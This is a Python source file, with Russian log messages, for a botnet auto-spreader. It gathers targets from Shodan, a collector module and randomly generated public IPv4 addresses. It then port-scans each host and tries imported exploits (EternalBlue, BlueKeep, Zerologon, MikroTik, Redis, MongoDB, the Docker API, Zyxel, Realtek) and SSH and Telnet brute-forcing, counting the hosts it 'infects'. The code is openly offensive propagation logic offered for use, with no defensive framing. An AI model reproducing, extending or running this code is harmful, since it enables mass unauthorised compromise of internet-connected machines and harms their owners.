import asyncio, threading, time, json, os, random, ipaddress, socket, struct, queue
from botnet.spreader import (
    ssh_bruteforce, telnet_bruteforce, exploit_eternalblue, exploit_bluekeep,
    exploit_mikrotik, exploit_zerologon, exploit_redis, exploit_mongodb,
    exploit_docker_api, exploit_zyxel, exploit_realtek, add_bot
)
from botnet.target_collector import fetch_targets
from utils.logger import log
import shodan

SCANNED_IPS_FILE = "scanned_ips.json"

class AutoSpreader:
    def __init__(self, settings_file="avz_settings.json"):
        self.running = False
        self.paused = False
        self.force_cycle = False
        self.thread = None
        self.message_queue = queue.Queue()
        self.stats = {'scanned':0, 'infected':0, 'open_ports':0}
        self.scanned_ips = set()
        self.max_targets = 5000
        self.load_settings(settings_file)
        self.load_scanned_ips()

    def load_settings(self, path):
        try:
            with open(path, "r") as f:
                s = json.load(f)
        except:
            s = {}
        self.enabled = s.get("auto_spread_enabled", True)
        self.interval = s.get("auto_spread_interval_min", 0.5) * 60
        self.worker_threads = s.get("spread_worker_threads", 2000)
        self.use_shodan = s.get("use_shodan", True)
        self.shodan_api = None
        try:
            if self.use_shodan:
                self.shodan_api = shodan.Shodan(s.get('shodan_api_key', ''))
        except: pass

    def load_scanned_ips(self):
        if os.path.exists(SCANNED_IPS_FILE):
            try:
                with open(SCANNED_IPS_FILE, 'r') as f:
                    self.scanned_ips = set(json.load(f))
            except:
                self.scanned_ips = set()

    def save_scanned_ips(self):
        with open(SCANNED_IPS_FILE, 'w') as f:
            json.dump(list(self.scanned_ips), f)

    def start(self):
        if self.running: return
        self.running = True
        self.paused = False
        self.force_cycle = False
        self.stats = {'scanned':0, 'infected':0, 'open_ports':0}
        self.thread = threading.Thread(target=self._worker, daemon=True)
        self.thread.start()
        self.message_queue.put("[System] INFECTION WAVE запущен")

    def pause(self):
        self.paused = True

    def resume(self):
        self.paused = False

    def stop(self):
        self.running = False
        self.save_scanned_ips()
        self.message_queue.put(f"[System] Стоп. Заражено: {self.stats['infected']}")

    async def attack_target(self, ip):
        ports = await ssh_bruteforce.__globals__['quick_port_scan'](
            ip, [22,23,445,3389,8291,6379,27017,2375,2323,2222,80,443,8080], timeout=0.2
        )
        if not ports:
            return False
        self.stats['open_ports'] += 1
        self.message_queue.put(f"[Ports] {ip} открыты: {ports}")
        if 8291 in ports and await exploit_mikrotik(ip):
            self.stats['infected'] += 1; return True
        if 80 in ports:
            if await exploit_zyxel(ip):
                self.stats['infected'] += 1; return True
            if await exploit_realtek(ip):
                self.stats['infected'] += 1; return True
        if 6379 in ports and await exploit_redis(ip):
            self.stats['infected'] += 1; return True
        if 27017 in ports and await exploit_mongodb(ip):
            self.stats['infected'] += 1; return True
        if 2375 in ports and await exploit_docker_api(ip):
            self.stats['infected'] += 1; return True
        for p in [23,2323]:
            if p in ports:
                if (await telnet_bruteforce(ip, p))[0]:
                    self.stats['infected'] += 1; return True
        for p in [22,2222]:
            if p in ports:
                if (await ssh_bruteforce(ip, 'root', p))[0]:
                    self.stats['infected'] += 1; return True
        if 445 in ports:
            if any(await asyncio.gather(exploit_eternalblue(ip), exploit_zerologon(ip))):
                self.stats['infected'] += 1; return True
        if 3389 in ports and await exploit_bluekeep(ip):
            self.stats['infected'] += 1; return True
        return False

    def _worker(self):
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        while self.running:
            if self.paused:
                time.sleep(1)
                continue
            target_ips = []
            if self.shodan_api:
                try:
                    results = self.shodan_api.search("port:22,23,8291,80,6379,27017,2375", limit=500)
                    for match in results['matches']:
                        ip = match['ip_str']
                        if ip not in self.scanned_ips:
                            target_ips.append(ip)
                            self.scanned_ips.add(ip)
                except: pass
            if not target_ips:
                public = loop.run_until_complete(fetch_targets())
                for ip in public[:self.max_targets]:
                    if ip not in self.scanned_ips:
                        target_ips.append(ip)
                        self.scanned_ips.add(ip)
            if not target_ips:
                for _ in range(min(500, self.max_targets)):
                    ip = str(ipaddress.IPv4Address(random.randint(0x01000000, 0xDFFFFFFF)))
                    if ip not in self.scanned_ips:
                        target_ips.append(ip)
                        self.scanned_ips.add(ip)
            if not target_ips:
                time.sleep(self.interval)
                continue
            self.stats['scanned'] += len(target_ips)
            self.message_queue.put(f"[Scan] {len(target_ips)} целей (всего просканировано: {self.stats['scanned']})")
            sem = asyncio.Semaphore(self.worker_threads)
            tasks = [self.attack_target(ip) for ip in target_ips]
            loop.run_until_complete(asyncio.gather(*tasks))
            self.message_queue.put(f"[Stats] Проверено: {self.stats['scanned']} | Заражено: {self.stats['infected']}")
            # Автосохранение лога? Не здесь, но можно добавить событие
            if self.force_cycle:
                self.force_cycle = False
                self.message_queue.put("[Auto] Принудительный цикл завершён")
            time.sleep(self.interval)

    def scan_once(self, target_list):
        if self.running:
            self.message_queue.put("[Ошибка] Автозахват уже запущен")
            return
        threading.Thread(target=self._scan_once_worker, args=(target_list,), daemon=True).start()

    def _scan_once_worker(self, target_list):
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        sem = asyncio.Semaphore(min(self.worker_threads, len(target_list)))
        tasks = [self.attack_target(ip) for ip in target_list]
        loop.run_until_complete(asyncio.gather(*tasks))
        self.message_queue.put(f"[Завершено] Обработано {len(target_list)} целей")
